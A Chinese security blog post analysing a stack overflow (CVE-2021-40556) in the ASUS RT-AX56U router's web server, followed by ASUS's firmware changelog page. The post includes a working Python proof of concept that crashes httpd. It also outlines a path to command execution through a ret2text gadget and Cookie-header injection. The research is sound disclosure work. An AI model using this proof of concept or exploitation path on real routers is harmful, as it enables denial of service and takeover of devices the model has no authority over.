=== Content from x1ng.top_a5a8bf42_20250108_131352.html ===


Toggle navigation

[X1ng](/)

* [Home](/)
* [About](/about/)
* [Tags](/tags/)

[漏洞挖掘](/tags/#漏洞挖掘 "漏洞挖掘")
[iot](/tags/#iot "iot")
# ASUS栈溢出漏洞分析

## CVE-2021-40556

Posted by X1ng on October 14, 2021

本文从挖掘漏洞的角度分析该漏洞，仅供学习用途，有不足之处敬请指出 or2

文章首发ChaMd5安全团队公众号

### 相关信息

[ASUS 2021/10/07更新公告](https://www.asus.com.cn/Networking-IoT-Servers/WiFi-Routers/ASUS-WiFi-Routers/RT-AX56U/HelpDesk_BIOS/)

![](https://tva1.sinaimg.cn/large/008i3skNly1gvdut7jickj60u019w0w602.jpg)

本文分析的漏洞为其中的栈溢出漏洞，另外经过华硕官方确认还有多个型号路由器存在该漏洞并均已修复

### 固件下载

华硕提供了非常全面的服务支持，可以在官网下载所有版本的固件

下载漏洞修复前的固件

[FW\_RT\_AX56U\_300438644266](https://dlsvr04.asus.com.cn/pub/ASUS/wireless/RT-AX56U/FW_RT_AX56U_300438644266.zip)

### 实验环境

由于虚拟环境较玄学，使用某鱼不到300rmb就可以买到的二手华硕RT-ax56u路由器，将下载的固件手动上传到设备

### 获取文件系统

先对文件系统进行解压，该固件中是ubi文件系统，如果使用binwalk直接解压只能得到一个ubi后缀的文件

可以使用[ubi\_reader](https://github.com/jrspruitt/ubi_reader)工具对固件进行解压，或者安装好ubi\_reader后用binwalk就可以直接解压了

```
binwalk -Me RT-AX56U_3.0.0.4_386_44266-g7f6b0df_cferom_pureubi.w

```
### 分析攻击面

可以通过三种方式获取该路由器端口信息，从而分析潜在的攻击面

1. nmap扫描端口

   扫描端口可以快速了解该路由器潜在的攻击面

   ```
    sudo nmap "192.168.50.1" -sU -sT -p0-65535

   ```

   ![](https://tva1.sinaimg.cn/large/008i3skNly1gvf35y9owaj61fw0oy44a02.jpg)
2. 通过uart串口获取shell后查看开放端口

   拆开路由器查看调试串口

   ![](https://tva1.sinaimg.cn/large/008i3skNly1gvdv42k098j61400u0gr202.jpg)

   用SecureCRT连接

   ![](https://tva1.sinaimg.cn/large/008i3skNly1gvdvfnc9b2j60u00xkafu02.jpg)

   > 对于该路由器有更加方便的方法，此处不对此方法进行赘述，关于uart串口连接可以参考[学习拆机调试路由器](https://x1ng.top/2020/12/06/%E5%AD%A6%E4%B9%A0%E6%8B%86%E6%9C%BA%E8%B0%83%E8%AF%95%E8%B7%AF%E7%94%B1%E5%99%A8/)

   ```
    netstat -aptu

   ```
3. 开启telnet/ssh获取shell后查看开放端口

   ![](https://tva1.sinaimg.cn/large/008i3skNly1gvevon7ptwj615k06q0tm02.jpg)

   此处用telnet连接

   ```
    netstat -aptu

   ```

可以看到开启的tcp和udp端口以及相关的服务

![](https://tva1.sinaimg.cn/large/008i3skNly1gvevoayvoij60zc0u0gro02.jpg)

在对该路由器进行测试的过程中由于对http协议最熟悉，优先对该固件中实现web功能的httpd文件进行分析，而本文分析的漏洞正是存在于httpd文件中

全局搜索httpd

```
find . | grep httpd

```

找到httpd文件

![](https://tva1.sinaimg.cn/large/008i3skNly1gulrxhgwasj60qr0j3n2k02.jpg)

### 逆向分析httpd服务文件

进行例行检查

![](https://tva1.sinaimg.cn/large/008i3skNly1gvevs1lbltj61zu04mju802.jpg)

为ARM架构小端序的程序，只开启了NX保护，也就是说对于内存破坏漏洞而言不能通过直接写入shellcode并跳转的方式来进行利用

ida进行逆向分析之前查找资料可以找到梅林固件httpd服务的[源代码](https://github.com/RMerl/asuswrt-merlin/blob/master/release/src/router/httpd/httpd.c)，虽然细微之处有所差别，但是大致框架一致，可以根据源码快速理解其实现逻辑

其处理http报文的主要功能在`static void handle_request(void)`函数中

```
static void
handle_request(void)
{
...
	while ( fgets( cur, line + sizeof(line) - cur, conn_fp ) != (char*) 0 )
	{
  	//获取http报文请求头（略）
    ...
  }
  ...
	for (handler = &mime_handlers[0]; handler->pattern; handler++) {
		if (match(handler->pattern, url))
		{
      ...
      if (handler->auth) {
        ...
        else{
          ...
					handler->auth(auth_userid, auth_passwd, auth_realm);
					auth_result = auth_check(auth_realm, authorization, url, file, cookies, fromapp);
					if (auth_result != 0)
					{
						if(strcasecmp(method, "post") == 0 && handler->input)   //response post request
							while (cl--) (void)fgetc(conn_fp);

						send_login_page(fromapp, auth_result, NULL, NULL, 0);
						return;
					}
				}
				...
			}else{
				...
			}
			if (handler->input) {
				handler->input(file, conn_fp, cl, boundary);
				...
			}
			...
			if (strcasecmp(method, "head") != 0 && handler->output) {
				handler->output(file, conn_fp);
			}
			break;
		}
	}

```

在项目的httpd.h文件中可以找到mime\_handler结构体定义

```
struct mime_handler {
	char *pattern;
	char *mime_type;
	char *extra_header;
	void (*input)(char *path, FILE *stream, int len, char *boundary);
	void (*output)(char *path, FILE *stream);
	void (*auth)(char *userid, char *passwd, char *realm);
};

```

其大致逻辑就是获取完报文请求头后遍历mime\_handlers结构体数组，根据用户访问的url找到对应的mime\_handler结构体，再判断鉴权以及调用其中的函数指针，这些被调用的函数就是需要重点审计的地方

在固件中也可以找到mime\_handlers结构体数组

经过逆向分析，最后在”caupload.cgi”字段的mime\_handler结构体中找到了存在漏洞的函数

![](https://tva1.sinaimg.cn/large/008i3skNly1gvew04qeshj60pe0jqwiv02.jpg)

### 分析漏洞

根据对handler的`input`函数调用的语句可以知道各参数的含义

![](https://tva1.sinaimg.cn/large/008i3skNly1gvewhaqsunj60pc0jt41y02.jpg)

这里只有3个参数，与源码中看到的调用语句不同，是因为ida没有识别出将第四个参数存入寄存器的过程，直接查看汇编代码就能看到对R3的赋值

进入”caupload.cgi”相关结构体的`input`函数，也能看到其实是有四个参数的

![](https://tva1.sinaimg.cn/large/008i3skNly1gvewrskesjj60p90jn41s02.jpg)

程序运行到这个函数的时候，http报文请求头已经被读取了，此时缓冲区中还有http报文的请求数据

![](https://tva1.sinaimg.cn/large/008i3skNly1gvex24iwllj60p90jndir02.jpg)

该函数从缓冲区中获取请求数据后保存在大小为0x10000的input3数组中，根据请求数据中的”name”字段进入不同的分支

而漏洞的成因是最后调用的`strcat`函数，程序会判断”Content-Length”字段判断请求数据的长度（通过第三个参数传递），将`fgets`从缓冲区获取到的字符串拼接到保存在栈上的变量v34后面，但是由于这里Content-Length的最大限制为0xffff，而该函数的栈帧长度只有0x1440，存在栈溢出漏洞

### 触发漏洞

逆向报文结构让程序能执行到调用`strcat`函数的分支，只需要在`Content-Disposition: form-data; name="file_ca"; filename=`后填充大量字符就可以造成溢出（通过burp抓包得到登录报文格式，在验证漏洞之前需要先进行登录）

poc.py：

```
#/usr/bin/python3
import requests
import socket
import base64
import sys

def attack(ip, username, passwd):
	login_url = "http://"+ip+"/login.cgi"
	hd = {"Host": "192.168.50.1",
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:56.0) Gecko/20100101 Firefox/56.0",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
		"Accept-Encoding": "gzip, deflate",
		"Referer": "http://192.168.50.1/Main_Login.asp",
		"Content-Type": "application/x-www-form-urlencoded",
		"Content-Length": "161",
		"Cookie": "clickedItem_tab=0; hwaddr=A8:5E:45:DD:96:08; apps_last=; maxBandwidth=100; bw_rtab=INTERNET; asus_token=lRZ0RCBKRnYW8GBQzCI2wHPzB7F7DYU",
		"Connection": "close",
		"Upgrade-Insecure-Requests": "1"
	}

	auth = username+':'+passwd
	auth = base64.b64encode(auth.encode('utf-8')).decode()
	print('[*] login...')
	da = "group_id=&action_mode=&action_script=&action_wait=5&current_page=Main_Login.asp&next_page=index.asp&login_authorization="+auth+"&login_captcha="
	r = requests.post(login_url,headers=hd,data = da, timeout=1000)
	cookie = r.headers['Set-Cookie'][11:-11]

	pd = 'Content-Disposition: form-data; name="file_ca"; filename=aaa\r\n'
	pd += '\r\n'
	pd += 'a'*0x2000

	attack_url = "http://"+ip+"/caupload.cgi"
	hd = {"Host": "192.168.50.1",
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:56.0) Gecko/20100101 Firefox/56.0",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
		"Accept-Encoding": "gzip, deflate",
		"Referer": "http://192.168.50.1/Advanced_VPNClient_Content.asp",
		"Content-Type": "application/x-www-form-urlencoded; boundary=---------------------------90665545817618071411188093951",
		"Content-Length": str(len(pd)),
		"Cookie": "clickedItem_tab=0; hwaddr=A8:5E:45:DD:96:08; apps_last=; maxBandwidth=100; bw_rtab=INTERNET; asus_token="+cookie,
		"Connection": "close",
		"Upgrade-Insecure-Requests": "1"
	}
	print('[*] Attacking')
	r = requests.post(attack_url,headers=hd,data = pd, timeout=1000)

def usage():
	print("Usage: python poc.py routerip username password")

if __name__ == "__main__":
	if len(sys.argv) < 3:
		usage()
	else:
		attack(ip=sys.argv[1],username=sys.argv[2], passwd=sys.argv[3])

```

发送报文后httpd服务崩溃，但是由于存在守护进程马上就会重新启动服务

![](https://tva1.sinaimg.cn/large/008i3skNly1gvezhwuh0xj60j802sgm202.jpg)

### 漏洞利用

与CTF不同的是，对于这种网络服务，进行溢出后进行ROP泄露地址再ret2libc的方法并不好用

1. 泄露地址后往往需要返回main函数重新输入溢出数据，但是由于配置等问题可能导致失败
2. 泄露地址不能通过`puts`等标准输出函数，而是需要向与用户连接的socket中输出

而其实对于该路由器而言

1. 栈地址与堆地址都是随机的（如果用qemu模拟环境可能是固定的），不能直接使用libc中的gadget
2. 开启了NX保护不能使用shellcode
3. 没有开启pie保护，程序基址还是固定的
4. 由于路由器为arm架构，程序中固定的地址最高位基本都是`\x00`

无法使用shellcode，甚至因为`strcat`函数存在`\x00`截断，构造ROP链都是问题，难道这里即使存在溢出漏洞也没有办法进行利用吗

其实是有办法的，ret2libc不行，倒是可以考虑ret2text

由于固定地址最高位是`\x00`，所以在内存中填充返回地址时的最后一个字节为`\x00`，也就是说有一次跳转地址的机会

在程序中寻找可能可以利用的gedget，直接对`system`、`popen`、`doSystem`（`system`函数的wraper函数）这样能执行命令的函数进行交叉引用搜索，可以找到一个特殊的函数调用

![](https://tva1.sinaimg.cn/large/008i3skNly1gvdu3297q8j61fb0u0wo402.jpg)

在ARM架构下获取字符串地址的指令一般是形如`ADD R0,PC,R0`这样的汇编指令，以PC寄存器作为基址寄存器通过偏移来获得字符串地址，而该函数调用的特殊之处在于，在调用`doSystem`函数之前，获取参数的指令是`LDR R0,[SP,#0x28]`

也就是说，如果在跳转到这个gadget之前能控制`[SP,#0x28]`这个地址上的内容，就能控制`doSystem`的参数达到执行命令的目的，而这里正好是可控的

对漏洞进行gdbserver远程调试（远程调试的具体步骤就不介绍了，可以参考[强网杯2020决赛-cisco-RV110W-漏洞复现](https://x1ng.top/2020/11/30/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%E5%86%B3%E8%B5%9B-cisco-RV110W-web%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/)中进行远程调试的详细步骤）

```
gdb-multiarch httpd
target remote 192.168.50.1:1234
b*0x51344
c

```

运行POC脚本发送http请求，溢出后将返回地址修改为0x5b43c，从断点处单步运行跳转到0x5b43c，查看`$sp+0x28`的值

```
x/20wx $sp+0x28

```

![](https://tva1.sinaimg.cn/large/008i3skNly1gvf23l6808j60q80j5djg02.jpg)

发现`[sp+0x28]`所指向的地址保存的其实是http报文请求头中Cookie，也就是说只要将命令注入到Cookie中，再溢出控制程序跳转到上文提到的`doSystem`函数之前，即可执行任意命令

但是为了让程序正常的读取Cookie，Cookie字段不能只是命令，需要在命令后拼接上原本Cookie的内容，并在二者之间用”;”分隔保证命令正确执行

exp就不放了，感兴趣的师傅可以自行调试编写

---

* [Previous

  CVE-2021-29083漏洞复现](/2021/09/17/CVE-2021-29083/ "CVE-2021-29083漏洞复现")
* [Next

  浙江2021省赛](/2021/10/24/%E6%B5%99%E6%B1%9F2021%E7%9C%81%E8%B5%9B%E5%88%9D%E8%B5%9B-pwn-wp/ "浙江2021省赛")

---

##### CATALOG

Copyright © X1ng 2023

Theme on GitHub |

![](/img/apple-touch-icon.png)



=== Content from www.asus.com_acce4d79_20250108_131352.html ===

   [![ROG](https://www.asus.com/media/Odin/images/header/ROG_normal.svg) ![ROG](https://www.asus.com/media/Odin/images/header/ROG_hover.svg)](https://rog.asus.com/tw/)[![創作者系列](https://www.asus.com/media/Odin/images/header/ProArt_normal.svg) ![創作者系列](https://www.asus.com/media/Odin/images/header/ProArt_hover.svg)](https://www.asus.com/tw/ProArt/)[![AIoT](https://www.asus.com/media/Odin/images/header/IoT_normal.svg) ![AIoT](https://www.asus.com/media/Odin/images/header/IoT_hover.svg)](https://iot.asus.com/tw/) [環境](https://www.asus.com/tw/content/sustainability-environment/)[華碩徵才](https://ehr.asus.com/)
電競

商用

手機 / 電競掌機

筆記型電腦

顯示器 / 桌上型電腦

主機板 / 零組件

網通產品 / IoT / 伺服器

周邊配件

商店
  [官方商城](https://www.asus.com/tw/store/)[體驗店](https://www.asus.com/tw/event/Asus_Store/)[教育與企業專案館](https://special-offers.asus.com/tw/)[商用客製](https://cto.asus.com/)[創作者系列選購](https://www.asus.com/tw/content/best-creator-laptops/)[保固延伸與加值服務](https://shop.asus.com/tw/purchase/seriesnum/index)
服務 & 社群
  [服務與支援](https://www.asus.com/tw/support/)[活動登錄專區](https://www.asus.com/tw/events/)[設備常見問題集](https://www.asus.com/tw/microsite/FAQ/)[ASUS VIP 尊榮服務](https://account.asus.com/tw/benefitsandpoint.aspx)[下載中心](https://www.asus.com/tw/support/Download-Center/)[維修進度查詢](https://www.asus.com/tw/support/Repair-Status-Inquiry/?cname=Taiwan)[板卡延保申請](https://www.asus.com/tw/events/infoM/activity_warranty-mb-vga)[線上自助申請報修](https://as-rma.asus.com/tw)[購買延展保固服務](https://www.asus.com/tw/support/faq/1041573/)[ZenTalk](https://zentalk.asus.com/)
My Account
   [環境](https://www.asus.com/tw/content/sustainability-environment/) [華碩徵才](https://ehr.asus.com/)
電競
  [ROG - Republic of Gamers](https://rog.asus.com/tw)[TUF Gaming](https://www.asus.com/campaign/tuf-gaming/tw/)
商用
  [商用站](https://www.asus.com/tw/business/)[企業租賃](https://www.asus.com/tw/events/infoM/activity_daas/)[ASUS Cloud](https://www.asuscloud.com) [![ROG](https://www.asus.com/media/Odin/images/header/ROG_hover.svg)](https://rog.asus.com/tw/)[![創作者系列](https://www.asus.com/media/Odin/images/header/ProArt_hover.svg)](https://www.asus.com/tw/ProArt/)[![AIoT](https://www.asus.com/media/Odin/images/header/IoT_hover.svg)](https://iot.asus.com/tw/)
商店

服務 & 社群

# RT-AX56U

* [功能特色](https://www.asus.com/tw/networking-iot-servers/wifi-routers/asus-wifi-routers/rt-ax56u/)
* [產品規格](https://www.asus.com/tw/networking-iot-servers/wifi-routers/asus-wifi-routers/rt-ax56u/techspec/)
* [評論](https://www.asus.com/tw/networking-iot-servers/wifi-routers/asus-wifi-routers/rt-ax56u/review/)
* [支援](https://www.asus.com/tw/networking-iot-servers/wifi-routers/asus-wifi-routers/rt-ax56u/helpdesk_knowledge/)
         ![](https://dlcdnwebimgs.asus.com/gain/a8474d45-4dd5-41af-a6bc-b7ea6e155cbb)  ![RT-AX56U](https://dlcdnwebimgs.asus.com/gain/fde25bea-a05b-49f3-90bf-83869ccc2eb0/w300/fwebp) 產品支援 RT-AX56U  [其他產品](https://www.asus.com/tw/support)  透過註冊華碩產品，可輕鬆管理您的產品保固資訊、並獲取技術支援以及追蹤產品的維修狀態。 產品註冊

## BIOS及韌體

* 驅動程式及工具程式
* BIOS及韌體

## 需要協助?

* [找尋服務據點](https://www.asus.com/tw/support/Service-Center/Taiwan/)
          Firmware ASUS RT-AX56U 韌體版本 3.0.0.4.386\_51712 版本 3.0.0.4.386\_51712  75.29 MB
2024/11/11

1. 加強輸入驗證和資料處理流程，進一步保護資訊安全
2. 增強了 AiCloud 密碼保護機制，防止未經授權的存取嘗試
3. 透過改善緩衝區處理來提升設備安全性
4. 增強數據處理流程，確保安全且準確的資訊管理
5. 強化檔案存取控制機制，提供更安全的操作環境
6. 強化憑證保護，提供更好的資料安全性

請先將檔案解壓縮後再用原始韌體檔案確認Checksum
SHA256: c8bcb1b4b9904d8d450126304ab8853cc730a11b18e29c40a21df61ed1a23cb4

已下載
 [DOWNLOAD](https://dlcdnets.asus.com/pub/ASUS/wireless/RT-AX56U/FW_RT_AX56U_300438651712.zip?model=RT-AX56U) 詳細訊息  ASUS RT-AX56U 韌體版本 3.0.0.4.386\_51679 版本 3.0.0.4.386\_51679  74.82 MB
2024/05/29

安全性修正:
-修正 command injection vulnerability.
-修正 the ARP poisoning vulnerability.
-修正code execution in custom OVPN.
-修正 the injection vulnerability in AiCloud.
-修正 stack buffer overflow in lighttpd.
-修正 CVE-2023-35720
-修正 the code execution vulnerability in AiCloud.
-修正 the XSS and Self-reflected HTML injection vulnerability.
\*請注意，此韌體版本包含許多安全性修正，我們強烈建議您更新至此韌體版本並且不要進行降版的動作。如果您有需要降版至舊的韌體版本，建議您手動更新舊的韌體版本後需要進行重置避免引起連線問題。

請先將檔案解壓縮後再用原始韌體檔案確認Checksum
SHA256: a86c8e003c15419d8c7eb6eab916a9078885682a00d5c7c8d5c07f78ba7694d6

已下載
 [DOWNLOAD](https://dlcdnets.asus.com/pub/ASUS/wireless/RT-AX56U/FW_RT_AX56U_300438651679.zip?model=RT-AX56U) 詳細訊息  ASUS RT-AX56U 韌體版本 3.0.0.4.386.51665 版本 3.0.0.4.386.51665  74.75 MB
2023/05/18

安全性修正
- Let's Encrypt 啟用並支援ECDSA認證
- 加強對認證的保護
- 加強對OTA韌體的保護
- 修正 DoS vulnerabilities in firewall configuration pages. 感謝Jinghe Gao's的貢獻
- 修正 DoS vulerabilities in httpd. 感謝Howard McGreehan的貢獻.
- 修正 information disclosure vulnerability. 感謝Junxu (Hillstone Network Security Research Institute)的貢獻
- 修正 CVE-2023-28702 and CVE-2023-28703. 感謝Xingyu Xu(@tmotfl)的貢獻
- 修正 null pointer dereference vulnerabilities. 感謝Chengfeng Ye, Prism Research Group-cse hkust的貢獻\
- 修正 the cfg server vulnerability. 感謝 Swing and Wang Duo from Chaitin Security Research Lab的貢獻.
- 修正 the vulnerability in the logmessage function CVE-2023-35086/ CVE-2023-35087. 感謝 Swing and Wang Duo from Chaitin Security Research Lab C0ss4ck from Bytedance Wuheng Lab, Feixincheng from X1cT34m 的貢獻.

請先將檔案解壓縮後再用原始韌體檔案確認Checksum
SHA256: e449985f2b02dc0217b723fa68425da21d033f2b3a6b9f929ca0f920ccdfe30a

已下載
 [DOWNLOAD](https://dlcdnets.asus.com/pub/ASUS/wireless/RT-AX56U/FW_RT_AX56U_300438651665.zip?model=RT-AX56U) 詳細訊息  ASUS RT-AX56U 韌體版本 3.0.0.4.386.49380 版本 3.0.0.4.386.49380  71.69 MB
2022/06/23

1. 修正 OpenSSL CVE-2022-0778
2. 修正 CVE-2021-34174
3. 增加阻止惡意軟體的安全措施
4. 修正 Stored XSS 漏洞. 感謝Milan Kyselica of IstroSec 的貢獻
5. 修正 CVE-2022-23970, CVE-2022-23971, CVE-2022-23972, CVE-2022-23973, CVE-2022-25595, CVE-2022-25596, CVE-2022-25597, CVE-2022-26376
6. 增加 WAN 第三方DNS伺服器列表 --> DNS有助於用戶增加連線安全性.
7. 透過ASUS router app 提供安全瀏覽功能，可過濾搜尋顯示內容。
8. 改善系統穩定性

請先將檔案解壓縮後再用原始韌體檔案進行MD5確認
MD5: 775b59bae64be20524a11102166faa90

已下載
 [DOWNLOAD](https://dlcdnets.asus.com/pub/ASUS/wireless/RT-AX56U/FW_RT_AX56U_300438649380.zip?model=RT-AX56U) 詳細訊息  ASUS RT-AX56U 韌體版本 3.0.0.4.386.45934 版本 3.0.0.4.386.45934  71.72 MB
2021/11/16

1. 修正 Let's encrypt相關問題.
2. 修正 httpd httpd 和 Cfg server DoS v 漏洞
感謝Wei Fan from NSFOCUS GeWuLAB.
3. 修正 stack overflow 漏洞
4. 修正 DoS 漏洞
感謝 Fans0n、le3d1ng、Mwen、daliy yang from 360 Future Security Labs貢獻

請先將檔案解壓縮後再用原始韌體檔案進行MD5確認
MD5:8691cf1edab615b45b2c1f9b3934654e

已下載
 [DOWNLOAD](https://dlcdnets.asus.com/pub/ASUS/wireless/RT-AX56U/FW_RT_AX56U_300438645934.zip?model=RT-AX56U) 詳細訊息  ASUS RT-AX56U 韌體版本 3.0.0.4.386.45898 版本 3.0.0.4.386.45898  71.18 MB
2021/10/07

此韌體版本包含以下安全性修正
BusyBox
- CVE-2016-2148
- CVE-2016-6301
- CVE-2018-1000517

cURL
- CVE-2020-8169
- CVE-2019-5481
- CVE-2019-5482
- CVE-2018-1000120
- CVE-2018- 1000300
- CVE-2018-16839

Lighttpd
- CVE-2018-19052

Linux
- CVE-2020-14305
- CVE-2020-25643
- CVE-2019-19052

lldpd
- CVE-2020-27827

Avahi
- CVE-2017-6519

hostapd
- CVE-2021-30004
- CVE-2019-16275

OpenVPN
- CVE-2020-11810
- CVE-2020-15078

wpa
- CVE-2021-30004
- CVE-2021-27803
- CVE-2019-11555
- CVE-2019-9499
- CVE-2019-9498
- CVE-2019-9497
- CVE-2019-9496
- CVE-2019-9495
- CVE-2019-9494
- CVE-2017-13086
- CVE-2017-13084
- CVE-2017-13082
- CVE-2016-4476
- CVE-2015-8041

- 修正 DoS vulnerability from spoofed sae authentication frame. 感謝以下人員的貢獻
Efstratios Chatzoglou, University of the Aegean.
Georgios Kambourakis, European Commission at the European Joint Research Centre.
Constantinos Kolias, University of Idaho.
- 修正 envrams exposed issue. 感謝 Quentin Kaiser from IoT Inspector Research Lab 的貢獻
- 修正AiMesh頁面多國語系顯示問題
- 修正Stored XSS 漏洞
- 修正CVE-2021-41435, CVE-2021-41436.
感謝以下人員的貢獻
Efstratios Chatzoglou, University of the Aegean
Georgios Kambourakis, European Commission at the European Joint Research Centre
Constantinos Kolias, University of Idaho.
- 修正Stack overflow漏洞. 感謝Jixing Wang (@chamd5)的貢獻
- 修正information disclosure vulnerability .感謝 CataLpa from DBappSecurity Co.,Ltd Hatlab 以及Yao Chen(@ysmilec) of 360 Alpha Lab的貢獻

請先將檔案解壓縮後再用原始韌體檔案進行MD5確認
MD5: 21310304e3674dac16d5780e5c0188db

已下載
 [DOWNLOAD](https://dlcdnets.asus.com/pub/ASUS/wireless/RT-AX56U/FW_RT_AX56U_300438645898.zip?model=RT-AX56U) 詳細訊息  ASUS RT-AX56U 韌體版本 3.0.0.4.386.44266 版本 3.0.0.4.386.44266  71.6 MB
2021/07/14

1. 改善系統穩定性
2. 新增支援 IPv6+ (外部網路WAN ->網際網路連線頁面)
3. 新增支援韌體自動更新功能。 (系統管理 ->韌體更新頁面)
4. 修正envrams exposed issue. 感謝Quentin Kaiser from IoT Inspector Research Lab 的貢獻

請先將檔案解壓縮後再用原始韌體檔案進行MD5確認
MD5: a86e0a2edf16fd0b43de8061a88e5838

已下載
 [DOWNLOAD](https://dlcdnets.asus.com/pub/ASUS/wireless/RT-AX56U/FW_RT_AX56U_300438644266.zip?model=RT-AX56U) 詳細訊息  ASUS RT-AX56U 韌體版本 3.0.0.4.386.42808 版本 3.0.0.4.386.42808  69.11 MB
2021/05/11

新功能
1. AiMesh2.0 相關
- 系統優化 : 提供一鍵優化AiMesh配置
- 當系統為有線骨幹模式(Ethernet Backhaul)，所有的節點都透過網路線連接，則所有無線資源都會優先給無線裝置。
- AiMesh系統重啟及還原至原廠設定
- 可讓裝置重新連線。裝置會先斷線再重新連線。
- 可指定裝置連線綁定特定AP
- 訪客網路功能可同步到整個AiMesh 系統。但AiMesh節點韌體版本須更新至3.0.0.4.386.xxxxx 版本
- 開放AiMesh 節點(AiMesh node)上的USB裝置功能

2. ASUS Router APP提供新的家庭介面
iOS平台須更新APP至v1.0.0.5.75或以上
Android平台須更新APP至v1.0.0.5.74或以上
3. 無線排程時間的設定最小單位更新為1分鐘
4. 支援IPSec IKE v1 及 IKE v2。 您可以透過Windows 10 native VPN client程式去連線到路由器的IPSec VPN伺服器。詳細可參考 https://www.asus.com/tw/support/FAQ/1033576
5. 2.4G及5G可在網路地圖的同一頁面做設定
6. 登入的驗證碼功能可至系統頁面做關閉
7. 印表機伺服器埠可在USB App頁面做關閉
8. 連接到訪客網路的裝置可在網路地圖> 閱覽名單 > 介面中查看
9. 修正Lets encrypt 認證問題
10. 新增IPTV支援國家

安全性修正
1. 修正 CVE-2020-25681, CVE-2020-25682, CVE-2020-25683, CVE-2020-25687, CVE-2020-25684, CVE-2020-25685, CVE-2020-25686
2. 更新dropbear版本至 2020.81
3. 修正 buffer overflow 漏洞
4. 修正slowloris denial of service attack.
5. 修正authentication bypass 漏洞
6. 修正fragattacks漏洞

請先將檔案解壓縮後再用原始韌體檔案進行MD5確認
MD5: b564ef0e3950af6966df740cc0d3f47a

已下載
 [DOWNLOAD](https://dlcdnets.asus.com/pub/ASUS/wireless/RT-AX56U/FW_RT_AX56U_300438642808.zip?model=RT-AX56U) 詳細訊息  ASUS RT-AX56U 韌體版本 3.0.0.4.384.10290 版本 3.0.0.4.384.10290  67.34 MB
2021/02/03

- 改善系統穩定性
- 修正Let’s Encrypt 功能異常

請先將檔案解壓縮後再用原始韌體檔案進行MD5確認
MD5: e14b25038a8d4944d22bd5e1b7073150

已下載
 [DOWNLOAD](https://dlcdnets.asus.com/pub/ASUS/wireless/RT-AX56U/FW_RT-AX56U_300438410290.zip?model=RT-AX56U) 詳細訊息  ASUS RT-AX56U 韌體版本 9.0.0.4.386.41994 (Beta 版) 版本 9.0.0.4.386.41994 測試版本 68.1 MB
2021/02/02

安全性修正:
修正 CVE-2020-25681, CVE-2020-25682, CVE-2020-25683, CVE-2020-25687, CVE-2020-25684, CVE-2020-25685, CVE-2020-25686

此為DNSmasq漏洞修正的Beta版韌體，請參考以下FAQ連結的方法二: 手動更新來進行此韌體升級。
https://www.asus.com/tw/support/FAQ/1008000

請先將檔案解壓縮後再用原始韌體檔案進行MD5確認
MD5: 4b40ba34afaa222de0abd0d213796538

已下載
 [DOWNLOAD](https://dlcdnets.asus.com/pub/ASUS/wireless/RT-AX56U/FW_RT-AX56U_900438641994.zip?model=RT-AX56U) 詳細訊息  ASUS RT-AX56U 韌體版本 3.0.0.4.384.9428 版本 3.0.0.4.384.9428  67.78 MB
2020/11/26

- 修正開機時LED燈號異常
- 改善系統穩定性

請先將檔案解壓縮後再用原始韌體檔案進行MD5確認
MD5: 273e5a895255012203a57d782c60d8d5

已下載
 [DOWNLOAD](https://dlcdnets.asus.com/pub/ASUS/wireless/RT-AX56U/FW_RT_AX56U_30043849428.zip?model=RT-AX56U) 詳細訊息  ASUS RT-AX56U 韌體版本 3.0.0.4.384.8253 版本 3.0.0.4.384.8253  66.16 MB
2020/01/17

- 改善穩定性
- 修正1024QAM GUI問題

請先將檔案解壓縮後再用原始韌體檔案進行MD5確認
MD5: a07ac50c5cf436052c44ad59cf4ead28

已下載
 [DOWNLOAD](https://dlcdnets.asus.com/pub/ASUS/wireless/RT-AX56U/FW_RT_AX56U_30043848253.zip?model=RT-AX56U) 詳細訊息  ASUS RT-AX56U 韌體版本 3.0.0.4.384.7764 版本 3.0.0.4.384.7764  70.21 MB
2019/12/17

- 官方初版發行

請先將檔案解壓縮後再用原始韌體檔案進行MD5確認
MD5: 666e5a4bde5a9fef822f12c37e50fd28

已下載
 [DOWNLOAD](https://dlcdnets.asus.com/pub/ASUS/wireless/RT-AX56U/FW_RT_AX56U_30043847764.zip?model=RT-AX56U) 詳細訊息   顯示所有檔案

* 經 FCC和加拿大工業部認證的產品將在美國和加拿大銷售。請參閱華碩美國和華碩加拿大網站，瞭解有關當地可用產品的資訊。
* 所有規格如有更改，恕不另行通知。請與您的供應商 / 經銷商確認確切的報價。產品可能並非在所有市場都可用。
* 規格和功能或內建軟體因型號而異，所有圖像僅供參考。有關完整詳細資訊，請參閱規格頁面。
* 印刷電路板顏色和內建軟體版本如有更改，恕不另行通知。
* 商標聲明：本網站所談論到的產品名稱僅做識別之用，而這些名稱可能是屬於其他公司的註冊商標或是版權。
* HDMI、HDMI High-Definition Multimedia Interface、HDMI 商業外觀及 HDMI 識別標章等詞彙均為 HDMI Licensing Administrator,Inc. 的商標或註冊商標。

* + USB 3.0、3.1、3.2 及 Type-C 的實際傳輸速度會因主機設備的處理速度、檔案屬性以及系統配置和操作環境等多種因素而有所不同。
  + 實際的數據吞吐量和 WiFi 覆蓋範圍會受到網路狀況和環境因素的影響，包括網路流量的大小、建築材料和結構以及網路負擔，這些因素會導致實際數據吞吐量和無線覆蓋範圍降低。
  + 所引用的網路速度和頻寬是基於現行的 IEEE 802.11ac/802.11ax 規範。實際性能可能會受到網路和服務提供商的因素、介面類型及其他條件的影響。為了達到最佳效果，連接的設備必須支援 802.11ac/802.11ax。
  + WPA/WPA2 企業級加密僅適用於單一路由器，在 AiMesh 模式下無法使用。
  + 當傳統 QoS 功能啟用時，會受到實際網際網路服務頻寬和不同環境的限制，可能會有速度降低的風險。
  + 由於 USB 外接硬碟和 4G/5G 數據機設備有不同的電源需求，為了確保外接設備能穩定使用，如果 USB 外接設備超過標準 USB 2.0 (5V/500mA) 和 USB 3.1 Gen 1 (5V/900mA) 的電源需求，您需要使用獨立的外接電源供應。
